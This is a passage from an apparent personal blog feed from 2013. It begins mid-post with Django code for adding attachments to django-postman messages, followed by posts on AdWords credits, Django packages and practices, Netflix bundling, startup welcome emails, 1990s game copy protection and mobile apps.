<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">allow_copies</span> <span class="o">=</span> <span class="ow">not</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">settings</span><span class="p">,</span> <span class="s">'POSTMAN_DISALLOW_COPIES_ON_REPLY'</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
<span class="k">class</span> <span class="nc">FullReplyImageForm</span><span class="p">(</span><span class="n">BaseReplyForm</span><span class="p">):</span>
    <span class="s">"""The complete reply form."""</span>
    <span class="k">if</span> <span class="n">allow_copies</span><span class="p">:</span>
        <span class="n">recipients</span> <span class="o">=</span> <span class="n">CommaSeparatedUserField</span><span class="p">(</span><span class="n">label</span><span class="o">=</span><span class="p">(</span><span class="n">_</span><span class="p">(</span><span class="s">"Additional recipients"</span><span class="p">),</span> <span class="n">_</span><span class="p">(</span><span class="s">"Additional recipient"</span><span class="p">)),</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

    <span class="n">file_ids</span> <span class="o">=</span> <span class="n">forms</span><span class="p">.</span><span class="n">CharField</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">widget</span><span class="o">=</span><span class="n">forms</span><span class="p">.</span><span class="n">HiddenInput</span><span class="p">())</span>

    <span class="k">class</span> <span class="nc">Meta</span><span class="p">(</span><span class="n">BaseReplyForm</span><span class="p">.</span><span class="n">Meta</span><span class="p">):</span>
        <span class="n">fields</span> <span class="o">=</span> <span class="p">([</span><span class="s">'recipients'</span><span class="p">]</span> <span class="k">if</span> <span class="n">allow_copies</span> <span class="k">else</span> <span class="p">[])</span> <span class="o">+</span> <span class="p">[</span><span class="s">'subject'</span><span class="p">,</span> <span class="s">'body'</span><span class="p">,</span> <span class="s">'file_ids'</span><span class="p">]</span>

    <span class="o">@</span><span class="n">transaction</span><span class="p">.</span><span class="n">commit_on_success</span>
    <span class="k">def</span> <span class="nf">save</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">recipient</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">parent</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">auto_moderators</span><span class="o">=</span><span class="p">[]):</span>
        <span class="c1">### Bunch of code from original save method in BaseWriteForm from django-postman
</span>        <span class="n">file_ids</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">cleaned_data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'file_ids'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)</span> <span class="k">if</span> <span class="n">x</span><span class="p">]</span>
        <span class="c1">### Bunch of code from original save method in BaseWriteForm from django-postman
</span>        <span class="k">for</span> <span class="n">file_id</span> <span class="ow">in</span> <span class="n">file_ids</span><span class="p">:</span>
            <span class="n">f</span> <span class="o">=</span> <span class="n">GenericFile</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">file_id</span><span class="p">)</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">Attachment</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">instance</span><span class="p">,</span><span class="n">attachment</span><span class="o">=</span><span class="n">f</span><span class="p">)</span>
            <span class="n">a</span><span class="p">.</span><span class="n">save</span><span class="p">()</span></code></pre></figure>

    </li>
</ul>

<p>In addition, we needed to override the default django-postman templates to display the attachments for a message as well as include the necessary javascript to deal with the jQuery File Upload piece.</p>

<ul>
    <li>view.html
        
<figure class="highlight"><pre><code class="language-html" data-lang="html">        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pm_body"</span><span class="nt">&gt;</span>{{ message.body|linebreaksbr }}<span class="nt">&lt;/div&gt;</span>
      {% if message.attachment_set.all %}
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"pm_attachments"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;span&gt;</span>Attachments<span class="nt">&lt;/span&gt;</span>
          <span class="nt">&lt;ul&gt;</span>
            {% for a in message.attachment_set.all %}
              <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{{ a.attachment.file.url }}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{{ a.attachment.file.url }}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
            {% endfor %}
          <span class="nt">&lt;/ul&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      {% endif %}</code></pre></figure>

    </li>

    <li>view.js
        
<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
  <span class="kd">var</span> <span class="nx">upload_ids</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments</span><span class="dl">'</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="dl">'</span><span class="s1">fileuploaddone</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Done uploading product images</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">result</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
      <span class="nx">upload_ids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">upload_ids</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">,</span><span class="dl">'</span><span class="p">)</span> <span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#id_file_ids</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span> <span class="nx">upload_ids</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">,</span><span class="dl">'</span><span class="p">)</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments td.preview</span><span class="dl">'</span><span class="p">).</span><span class="nx">length</span> <span class="o">==</span> <span class="nx">upload_ids</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Enabling input</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#reply-form button[type="submit"]</span><span class="dl">'</span><span class="p">).</span><span class="nx">removeAttr</span><span class="p">(</span><span class="dl">'</span><span class="s1">disabled</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">};</span>
  <span class="p">});</span>

  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments</span><span class="dl">'</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="dl">'</span><span class="s1">fileuploadstart</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Disabling input</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#reply-form button[type="submit"]</span><span class="dl">'</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">'</span><span class="s1">disabled</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">disabled</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">});</span>

  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments</span><span class="dl">'</span><span class="p">).</span><span class="nx">bind</span><span class="p">(</span><span class="dl">'</span><span class="s1">fileuploadpreviewdone</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments td.preview</span><span class="dl">'</span><span class="p">).</span><span class="nx">length</span> <span class="o">==</span> <span class="nx">product_image_ids</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#fileupload-attachments tbody.files tr</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">();</span>
    <span class="p">};</span>
  <span class="p">});</span>
<span class="p">});</span></code></pre></figure>

    </li>
</ul>

<p>The last minor thing we needed to do was update our urls.py file to override the standard django-postman urls to have them use our custom form.</p>

<ul>
    <li>urls.py
        
<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">url</span><span class="p">(</span><span class="s">r'^messages/reply/(?P&lt;message_id&gt;[\d]+)/$'</span><span class="p">,</span> <span class="s">'postman.views.reply'</span><span class="p">,</span>
        <span class="p">{</span><span class="s">'form_class'</span><span class="p">:</span> <span class="n">FullReplyImageForm</span><span class="p">},</span>
        <span class="n">name</span><span class="o">=</span><span class="s">'postman_reply'</span><span class="p">),</span>
<span class="n">url</span><span class="p">(</span><span class="s">r'^messages/view/t/(?P&lt;thread_id&gt;[\d]+)/$'</span><span class="p">,</span> <span class="s">'postman.views.view_conversation'</span><span class="p">,</span>
        <span class="p">{</span><span class="s">'form_class'</span><span class="p">:</span> <span class="n">FullReplyImageForm</span><span class="p">},</span>
        <span class="n">name</span><span class="o">=</span><span class="s">'postman_view_conversation'</span><span class="p">),</span>
<span class="n">url</span><span class="p">(</span><span class="s">r'^messages/'</span><span class="p">,</span> <span class="n">include</span><span class="p">(</span><span class="s">'postman.urls'</span><span class="p">)),</span></code></pre></figure>

    </li>
</ul>

<p>I’d love to release this publicly but don’t have much experience creating standalone Django apps. If you have experience in open sourcing Django apps let me know - I’d love to get this out there as a standalone app or somehow incorporated into django-postman.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google's “free” Adwords credits</title>
   <link href="http://dangoldin.com/2013/05/15/googles-free-adwords-credits/"/>
   <updated>2013-05-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/15/googles-free-adwords-credits</id>
   <content:encoded><![CDATA[
<p>Since we’re using Google Apps for Business for our startup, we’ve been getting a bunch of emails trying to get us to sign up for Adwords. The latest promotion is offering a credit of $300 if we spend $100. It’s a pretty common marketing tactic and tons of companies have similar promotions. What’s special about Google is that they’re running an auction for every single click and by giving some businesses free money, they’re driving the prices up for the entire market.</p>

<p>Without being at Google, it’s impossible to know what effect this has but I tried to do some estimates. According to the <a href="http://www.nytimes.com/2012/12/26/technology/google-apps-moving-onto-microsofts-business-turf.html?_r=0" target="_blank">NY Times</a>, Google had 4M businesses on Google Apps at the end of 2011 and by June of 2012 it was up to 5M. So over the first 6 months of 2012, Google Apps gained 1M businesses. If each of those businesses was offered $300 a credit and took Google up on it, there would be an extra $300M in the Adwords market provided by Google, in addition to that business’s Adwords contribution. If we compare this against Google’s advertising revenue during the first <a href="http://investor.google.com/financial/2012/tables.html" target="_blank">two quarters</a> of 2012, $20,750M, we get 1.4%. That may not seem that big but think of every bid on Google Adwords increasing by 1%. Of course, not every business took Google up on the offer so the true number is going to be lower but I’d bet even then it’s still enough to affect the market.</p>

<p>I was trying to think of an analogy but had trouble. I initially thought this is similar to a casino giving some of the poker players free money but then realized that the majority of that money will still end up in the hands of players. I then thought it would be akin to ebay offering free credit to some buyers, but once again, most of the value would still captured by the marketplace participants; either by sellers getting higher prices or by buyers being able to buy more or better items. I finally settled on the idea of an amusement park offering free passes to random people. Those people end up making the park more crowded for the visitors who paid yet still buy concessions and the amusement park profits.</p>

<p>I suppose this is what happens when the dominant company in a market full of near-zero marginal cost products runs a promotion. I don’t know whether Google has a responsibility to their existing businesses to keep the auction fair but I know if I were advertising on Google I wouldn’t be too happy with Google giving free credits to my competitors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Eighteen Months of Django: Part 2</title>
   <link href="http://dangoldin.com/2013/05/10/eighteen-months-of-django-part-2/"/>
   <updated>2013-05-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/10/eighteen-months-of-django-part-2</id>
   <content:encoded><![CDATA[
<p>On Tuesday, I shared some <a href="http://dangoldin.com/2013/05/07/eighteen-months-of-django/" target="_blank">best practices</a> I picked up while using Django. This is a follow up post to share the packages that I found useful as well as various hiccups I encountered when using them.</p>

<ul class="bulleted">
    <li>
    <a href="https://django-registration.readthedocs.org/en/latest/index.html" target="_blank">django-registration</a> and <a href="http://django-social-auth.readthedocs.org/en/latest/" target="_blank">django-social-auth</a>: Combined, these packages let you handle the basic user registration and activation. Most likely, you will end up having to customize them a bit to do what you want. For example, allowing a user to register using an email address instead of a username or requiring an email address for a user who signs up using Twitter. A small issue that annoyed me is that the signals generated by these two packages occur at different points: django-registration generates signals that includes the request while django-social-auth generates signals that contain the response from the OAuth provider. Depending on your use-case, it may be worth it to use the <a href="https://django-registration.readthedocs.org/en/latest/simple-backend.html" target="_blank">simple backend</a> for django-registration, it automatically activates and logs-in the newly registered users, making your app a bit easy to get into.</li>
    <li><a href="http://django-storages.readthedocs.org/en/latest/" target="_blank">django-storages</a> and <a href="http://docs.pythonboto.org/en/latest/" target="_blank">boto</a>: If you plan on using S3 to host static content, definitely take a look at these. They provide backends to make it easy to save and access your static content to S3 without having to deal with the AWS API. I ran into some issues using this along with Cloudfront and django-compressor but I was able to fix them by looking at <a href="http://stackoverflow.com/questions/8688815/django-compressor-how-to-write-to-s3-read-from-cloudfront" target="_blank">Stackoverflow</a>.</li>
    <li><a href="http://django-compressor.readthedocs.org/en/latest/" target="_blank">django-compressor</a>: This is a neat library that will compress and minify your JS and CSS, check if anything’s been updated, generate an upload the result to static files location, and update the HTML to point to the new location. This makes sure that users never end up with older, cached versions of your static files. One thing to note is that you need to make sure that your Javascript are properly formatted and all end in a semi-colon; otherwise you run the risk of the compression failing. I know that there are other Django compressors <a href="http://django-pipeline.readthedocs.org/en/latest/" target="_blank">out there</a> but I’ve been happy with django-compressor.</li>
    <li><a href="http://sorl-thumbnail.readthedocs.org/en/latest/" target="_blank">sorl-thumbnail</a> and <a href="http://www.pythonware.com/products/pil/" target="_blank">PIL</a>: If you allow users to upload images this is a must have. It provides a standard way of resizing the images and caching the result. The library comes built in with support for cropping and a variety of other processing options so you don’t have to worry about it. One thing to note is that if a user is loading a page where none of the images have been generated yet, it will delay the page load until all of the images are generated. As long as you know the required sizes of all images, you can run a task on the <a href="http://sorl-thumbnail.readthedocs.org/en/latest/examples.html#low-level-api-examples" target="_blank">backend to generate</a> each of the images. You may have trouble installing PIL in a virtualenv but doing some Googling it should be easy to figure out.</li>
    <li><a href="http://pythonhosted.org/django-extensions/" target="_blank">django-extensions</a>: Just a neat library that comes with additional management commands to make developing Django easier.</li>
    <li><a href="https://github.com/django-debug-toolbar/django-debug-toolbar" target="_blank">django-debug-toolbar</a>: This intercepts every Django request and provides some debug information to help you optimize your code. The most useful piece to me is being able to see the SQL queries that are being executed and helps me figure out what needs tweaking/caching.</li>
    <li><a href="http://django-crispy-forms.readthedocs.org/en/latest/" target="_blank">django-crispy-forms</a>: If you’re using Twitter Bootstrap, this is a library that lets you generate Bootstrap forms in Django.</li>
    <li><a href="http://docs.celeryproject.org/en/latest/django/" target="_blank">django-celery</a> and <a href="http://celeryproject.org/" target="_blank">celery</a>: This is a way to run tasks in the background. With Pressi, we initially started with some management commands behind some cron jobs but we ended up switching to Celery when we wanted to distribute it across multiple machines and have built in support for threading and error handling. One thing to note is that we used RabbitMQ as the backend but it takes a bit of time to setup and I’m still struggling to understand the ways to manage it. A lot of people have been using Redis as the backend successfully and I think I’ll give that a go in future projects.</li>
    <li><a href="http://mongoengine.org/" target="_blank">mongoengine</a> and <a href="http://api.mongodb.org/python/current/" target="_blank">pymongo</a>: If you’re using Mongo, take a look at mongoengine, which serves as an ORM for Mongo, and is built on top of PyMongo, a Mongo API. Mongoengine makes it very easy to change your models from a relational database to an documented-based one by keeping the field types and model definitions similar. Be aware that document-based databases are significantly different from relational ones and that although cosmetically your models look similar, the interaction with the backend is very different. You shouldn’t switch to MongoDB just because you can - make sure you’re switching for the right reasons. For Pressi, we use a hybrid approach where we use MongoDB to store a user’s social media content with everything else stored in MySQL. Something to be cautious of is that both of these libraries have been evolving pretty quickly and we ran into an issue where we weren't able to consistently connect to a MongoDB instance until we stumbled unto the right versions of the libraries (in our case, 0.6.20 for mongoengine and 2.4.1 for pymongo).</li>
    <li><a href="http://haystacksearch.org/" target="_blank">django-haystack</a>: When you’re ready to graduate from implementing a search using QuerySet filters to an indexing backend, take a look at Haystack. It provides a pretty simple search interface that integrates pretty well with Django and supports a few different backends. We ended up settling on the <a href="http://xapian.org/" target="_blank">Xapian</a> backend because it was supposedly simpler but ran into some trouble installing it inside a virtualenv until I found <a href="https://gist.github.com/vinilios/199025" target="_blank">this post</a>. Note that although Haystack supports multiple backends, not all features are supported by every backend so make sure the backend you choose supports everything you need. I believe Solr has the most functionality out of the box but we wanted to keep it simple for Makers Alley.</li>
    <li><a href="https://django-postman.readthedocs.org/en/latest/quickstart.html" target="_blank">django-postman</a>: We just implemented this for Makers Alley but it’s a very simple way of doing user to user messaging. It comes with the standard messaging features (inbox, reply, archive, delete) but one thing I wish it had was a way to include attachments.</li>
    <li><a href="http://docs.fabfile.org/en/1.6/" target="_blank">Fabric</a>: I mentioned this in the previous post but wanted to reiterate it since it makes building and deploying your code easy. It also forces you to think about your environment and you end up with a better structured project as a result.</li>
    <li><a href="http://south.aeracode.org/" target="_blank">South</a>: Another package I mentioned earlier that makes it significantly easier to deal with database migrations in Django. The only time we've run into issues using South is when two of us were making changes to the same model in parallel branches. Even then it's easy to replace the two flawed migrations with a functional one.</li>
    <li><a href="https://pypi.python.org/pypi/Unidecode" target="_blank">Unidecode</a>: This isn’t a Django specific library but we found it useful when cleaning up unicode data. If you ever get random unicode exceptions in your code, Unidecode should be able to help.</li>
    <li><a href="http://www.crummy.com/software/BeautifulSoup/" target="_blank">BeautifulSoup</a> and <a href="http://pythonhosted.org/pyquery/index.html" target="_blank">PyQuery</a>: If you need to do some HTML scraping in Python, take a look at BeautifulSoup. It turns HTML code into an object that’s easy to navigate and search. After getting more and more familiar with jQuery, I found a python alternative in PyQuery but am still getting comfortable with it. If you come from the jQuery world I’d try using PyQuery first; otherwise I’d try BeautifulSoup.</li>
    <li><a href="http://docs.python-requests.org/en/latest/" target="_blank">requests</a>: Just a nice and simple replacement of urllib and urllib2 that makes it much simpler to make HTTP requests. Your code becomes cleaner, more readable, and more expressive.</li>
</ul>

<p>I tried to highlight the libraries that have made developing in Django easier but I’m sure there are tons more. I’d love to hear about them so do share.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Eighteen months of Django</title>
   <link href="http://dangoldin.com/2013/05/07/eighteen-months-of-django/"/>
   <updated>2013-05-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/07/eighteen-months-of-django</id>
   <content:encoded><![CDATA[
<p>I’ve discovered that every new project lets me correct mistakes from my earlier attempts by allowing me to start from scratch. This is especially true with a web framework such as Django that has a ton of little nooks and crannies that take a while to explore and understand. It’s usually not worth it to go back and fix something that’s not broken on a functional product but starting a new project lets me do it right from the beginning. Now that I’ve developed and launched (with <a href="http://www.sandylin.com/" target="_blank">Sandy</a> and <a href="http://marcschaffnergurney.com/" target="_blank">Marc</a>) two serious Django-based products as well as bunch of smaller ones, I wanted to document some personal best practices I’ve picked up. Obviously, I’m still learning and I may be completely wrong with them so let me know if you disagree. If you’re interested in a deeper look at some of the topics let me know and I can write up another post going into detail about a particular topic.</p>

<ul class="bulleted">
    <li>Use <a href="https://pypi.python.org/pypi/virtualenv" target="_blank">virtualenv</a>: Virtualenv lets you create a virtual environment for each project you’re working on with its own version of Python and its own libraries. I’ve also created alias commands for my major projects that make moving to and activating the virtualenv of that project a single command. Note that using a virtualenv does make a few things more difficult (such as installing <a href="http://mdshaonimran.wordpress.com/2012/01/14/virtualenv-environmenterror-mysql_config-not-found/" target="_blank">MySQL-python</a>, setting up nginx, configuring <a href="http://stackoverflow.com/questions/1180411/activate-a-virtualenv-via-fabric-as-deploy-user/5359988#5359988" target="_blank">fabric</a>, getting supervisor running) but they’re all surmountable via Stackoverflow and Google.</li>

    <li>Use <a href="http://south.aeracode.org/" target="_blank">South</a>: A simpler way of handling database migrations in Django. It’s natural to be updating your database models as the app grows and South makes the migration a little bit easier. It’s not perfect and every once in a while I’ll need to revert some of the migrations and craft them by hand but it’s still better than the alternative.</li>

    <li>Use <a href="http://docs.fabfile.org/en/1.6/" target="_blank">Fabric</a>: Fabric gives you the ability to set up your own set of commands that can interact with a remote server. This lets you do git pulls, deployments, and run any other command on a server without needing to manually SSH. This becomes especially useful when you have your app served by multiple machines with each one having a different role.</li>

    <li>Use <a href="http://supervisord.org/" target="_blank">Supervisor</a>: Supervisor monitors the running processes and can restart any that go down.</li>

    <li>Nginx/Gunicorn vs Apache: I’ve used both and don’t have strong feelings about either one. I think there’s more information online about getting Apache running but I’ve found Nginx/Gunicorn a bit easier to configure and debug. The other benefits I’ve gotten from Nginx/Gunciron is that it’s less memory intensive out of the box than Apache and I was able to get it to play nicely with Supervisor. In full disclosure, I haven’t really tried to do the same with Apache and it may very well be possible.</li>

    <li>Use S3 for static files: Hosting your static files as well as user-uploaded files on S3 is a nice win. You don’t have to worry about serving static content and you can also move the static elements away from your web server. Another benefit I’ve found is that once you move to multiple web servers, it’s nice having all static content on a 3rd party on S3 since that allows all web servers to remain stateless and insync. Otherwise you have to worry about a user uploading a file to one web server and then having to copy it over to the other one to make it accessible.</li>

    <li>MySQL/PostgreSQL vs RDS: Unless you plan on monetizing immediately, I suggest using MySQL/PostgreSQL. RDS ends up getting pretty expensive and configuring it isn’t as straightforward as modifying a local installation of MySQL or PostgreSQL. If you end up running into scaling issues you can make the move to RDS relatively easily (especially with MySQL) by dumping and reimporting your database and updating your production settings file.</li>

    <li>On Django packages: Install new packages using pip instead of just downloading them into your project folder unless you know you’ll be modifying them. Even then, the well written packages let you customize their behavior by writing your own views, templates, and middleware that can exist outside the installed package. This will keep your project much simpler and better organized, and will force you focus on your app rather than trying to hack someone else’s.</li>
</ul>

<p>After writing this, I realize I need do another post about the Django packages I’ve found to be useful. I’ll put that together in a future post.</p>

<p>Edit: Here’s the <a href="http://dangoldin.com/2013/05/10/eighteen-months-of-django-part-2/">follow-up post</a> where I cover useful packages.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Netflix, bundling, and the future of video</title>
   <link href="http://dangoldin.com/2013/05/05/netflix-bundling-and-the-future-of-video/"/>
   <updated>2013-05-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/05/netflix-bundling-and-the-future-of-video</id>
   <content:encoded><![CDATA[
<p>Something that’s been stuck in my head is the relationship between Netflix and bundling. On one hand, we’ve been wishing that cable came unbundled so we’d be able to just pay for the shows we want to watch. On the other hand, we have Netflix which is striving to let us stream every TV show and movie whenever and wherever we want. Why don’t we care that Netflix is actually a bundled product?</p>

<p>I’m sure the major reason is that it’s just not worth worrying about since Netflix is only $7.99 a month; especially when cable TV bills can easily go past $100. Maybe we like the new shows that are exclusive to Netflix (House of Cards, Hemlock Grove, and Arrested Development) and are happy to pay for them; the rest of the content available on Netflix is just an added benefit. Maybe we just don’t view Netflix as being a bundled service at all: the reason I have Netflix is to be able to watch anything I want when I want.</p>

<p>I wonder about the reasons because it helps me think about the future:</p>

<ul class="bulleted">
<li>Does Netflix want to be the central repository of all video content that can be accessed at any time? What happens when the existing content producers keep raising licensing fees to extract as much as they can?</li>
<li>Does Netflix want to focus on producing its own content? Is it just a TV channel with a unique distribution channel and monetization approach? Does this mean that we’ll start seeing competing TV show/movie producers creating their own Netflix like service? How easy will it be for consumers to find this content if it’s heavily fragmented?</li>
<li>Will the future consist of niche shows and movies? Kickstarter has been used to raise money for the <a href="http://www.kickstarter.com/projects/559914737/the-veronica-mars-movie-project" target="_blank">Veronica Mars</a> movie as well as Zach Braff’s <a href="http://www.kickstarter.com/projects/1869987317/wish-i-was-here-1" target="_blank">“Wish I was here.</a>” Will we just have thousands of shows that are just supported by small groups of passionate fans?</li>
</ul>

<p>I suspect we’ll see a combined approach. Mass market won’t be going away since we all want to stand around the water cooler and chat about the latest episodes but we will start having more and more shows and movies that are catered to our interests and passions. This specialization has been happening throughout the 20th century to our physical products and it’s going to extend to the emotional ones. I don’t know whether it’ll be Netflix, Kickstarter, or some unknown company that’ll make it happen but I do believe it’s inevitable.</p>

<p>Disclosure: I own Netflix stock.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Follow through on that personal welcome email</title>
   <link href="http://dangoldin.com/2013/05/02/follow-through-on-that-personal-welcome-email/"/>
   <updated>2013-05-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/05/02/follow-through-on-that-personal-welcome-email</id>
   <content:encoded><![CDATA[
<p>Recently, I’ve been receiving many startups sending out “personal emails” from the CEO or cofounder around 30 minutes after signing up. The idea is to engage the new user by showing them that there’s a real person behind the service that cares and to offer any help that they may need. There’s a great <a href="https://segment.io/academy/email-is-the-easiest-way-to-improve-retention" target="_blank">article</a> on Segment.io about this tactic as well as a few other emails that can be sent to improve retention. This technique is called “drip marketing” and there are a bunch of companies offering it as a service - the ones I can immediately think of are <a href="http://www.getvero.com/" target="_blank">Vero</a> and <a href="http://intercom.io" target="_blank">Intercom</a>; and Mixpanel is moving into this space as well with their <a href="https://mixpanel.com/notifications/" target="_blank">Notifications</a> product. There are also a variety of open source packages available, I’m familiar with <a href="https://django-drip.readthedocs.org/en/latest/" target="_blank">django-drip</a> for Django and Dan Shipper’s <a href="https://github.com/dshipper/Faucet" target="_blank">Faucet</a> for RoR.</p>

<p>The twist is that you actually need to respond to the people who reply to the email. There have been numerous times where I’d reply to this email without ever receiving a response. At least I understand that the email was most likely automated; I suspect most users wouldn’t be so understanding. I’m not sure why I need to point this out but if you do decide to send out these personal emails, make sure you’re actually going to respond to each reply. Otherwise you’re better off not sending that email in the first place.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some gaming nostalgia</title>
   <link href="http://dangoldin.com/2013/04/29/some-gaming-nostalgia/"/>
   <updated>2013-04-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/29/some-gaming-nostalgia</id>
   <content:encoded><![CDATA[
<p>In the early 90s, being a kid new to the US and new to computers I developed an addiction to computer games. I’d play everything that I got my hands on and remember sharing floppy disks with school friends. Unfortunately, I was plagued by two issues that had pretty clever approaches: age verification and piracy protection.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/lsl-bar.png" alt="Leisure Suit Larry" width="320" height="200"/>
</div>

<p>The first manifested itself in <a href="http://en.wikipedia.org/wiki/Leisure_Suit_Larry" target="_blank">Leisure Suit Larry</a>. I was as giddy as only a kid can be when I got my hands on it. Unfortunately, that went away when I was required to take an “age quiz” as soon as the game loaded. The age quiz consisted of a series of multiple questions that only an adult would be able to answer. These ranged from factual ones such as “Who recorded ‘Let it be’?” to comical ones such as “Do girls really have cooties?” I do have memories of playing it so I must have figured out some way around the verification. I must have either guesses correctly some of the time or took notes of the answers that allowed me to play.</p>

<p>Another game I enjoyed was a basketball game that I suspect was <a href="http://www.youtube.com/watch?v=2AH6RUGwGfY" target="_blank">Lakers vs Celtics and the NBA Playoffs</a>. Unfortunately, I got the disk from a friend and it had a nifty way of dealing with piracy. When starting the game, it would ask to provide information that could only be found in the game manual, for example asking for the 7th word on the 15th page.</p>

<p>Sadly, both of these approaches disappeared as task switching became standard in the newer operating systems and internet access became common.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smart software; dumb hardware</title>
   <link href="http://dangoldin.com/2013/04/24/smart-software-dumb-hardware/"/>
   <updated>2013-04-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/24/smart-software-dumb-hardware</id>
   <content:encoded><![CDATA[
<p>Last week, three isolated events gave me a glimpse of how powerful mobile can be. Tech pundits have been saying that for a while now but experiencing it firsthand is definitely more convincing.</p>

<ul class="bulleted">
    <li>I went for a run with only my phone to keep me company. After my run was done, I wanted to grab a cup of iced coffee and realized that Starbucks gave me a free drink on my birthday. Downloading the app on my phone allowed me to get a drink without having cash or a wallet.</li>
    <li>While checking out at a grocery store, a friend showed me CardStar which allowed him to store all his loyalty cards on his phone. Since then, I’ve imported all my loyalty cards that have just been sitting in a drawer into my phone.</li>
    <li>After getting a Raspberry Pi and installing Raspbmc, I was able to use my phone as a remote control just by downloading an app.</li>
</ul>

